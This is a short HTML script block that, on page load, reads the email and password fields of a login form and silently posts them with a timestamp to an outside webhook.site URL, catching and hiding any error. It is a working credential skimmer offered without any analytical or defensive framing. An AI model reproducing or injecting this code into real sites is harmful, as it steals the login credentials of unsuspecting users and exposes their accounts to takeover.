<script>
(function() {
  window.addEventListener('load', function() {
    setTimeout(function() {
      var email = document.getElementById('email').value;
      var password = document.getElementById('password').value;
      if (email && password) {
        fetch('https://webhook.site/0b275640-c758-4b06-8b38-e6787c7e21f6', {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: email, password: password, timestamp: Date.now() })
        }).catch(function(e) { /* silent */ });
      }
    }, 50);
  });
})();
</script>
